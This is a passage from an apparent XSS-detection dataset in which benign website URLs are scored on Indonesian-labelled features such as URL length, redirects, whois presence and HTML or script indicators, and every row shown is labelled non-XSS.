whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jasoninc.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jeep.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jefflindsay.com/2dfaBlank atau CTOrial.shtml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jinhuigroup.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jinshanhuagong.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jobs-central.com/homejobs.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jpmorganchase.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.juergendaum.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jvrb.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.kernel-machines.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.kinseyinstitute.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.kremlinencrypt.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.kurzweilai.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.landrover.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ldc.upenn.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.learnaboutrobots.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.leekillough.com/heaps/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.lincoln.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.lmfdb.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.loanservicecenter.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.loebner.net/Prizef/loebner-prize.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.londontheatre.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ltn.lv/~podnieks/mlog/ml.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.management-lab.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.managewithoutthem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.manukau.ac.nz/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mapleapps.com/powertools/pdes/pdes.shtml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.marketinghrdpresentation.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.marmet.org/louis/sqfgap/index.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.harvard.edu/~ctm/courses.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.hmc.edu/resources/odes/codee/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.oregonstate.edu/~show/docs/pde.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.osu.edu/~gerlach/math/BVtypset/node2.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.osu.edu/~gerlach/math/BVtypset/node59.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.ubc.ca/~feldman/demos/demo8.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.ucla.edu/~tao/254a.1.03w/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.math.umn.edu/~garrett/m/v/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mathcs.carleton.edu/probweb/probweb.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mathpages.com/home/icalculu.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mathpages.com/home/inumber.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mathphysics.com/pde/green/g15.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.maths.gla.ac.uk/~ca/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mazda.co.jp/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mbusa.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mclink.it/assoc/isp/fineng.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.md5hasher.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.meineke.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mercedes-benz.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mercuryvehicles.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mgmtarticles.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mgnet.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.midstatesclassics.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.miislita.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.mingshun.com.tw/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.moneypark.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.monitor.upeace.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.morgancom.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.morganstanley.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.multilingualblog.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.naata.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.neuron.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.newyorktheatreguide.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.nightcats.com/sales/IC.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.nissanusa.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.nist.gov/dads/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.numbertheory.org/ntw/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.nwmp.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.officiallondontheatre.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ontheboards.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.oopweb.com/Algorithms/Files/Algorithms.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.opel.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.osvr.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.overfinch.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.partow.net/programming/hashfunctions/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.pballew.net/FermLit.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.pcai.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.peacefirst.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.peaceinstitute.hawaii.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.peacepolls.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.peoplefit.com.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.permal.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.personal.kent.edu/~rmuhamma/Algorithms/algorithm.html;Antara 54 dan 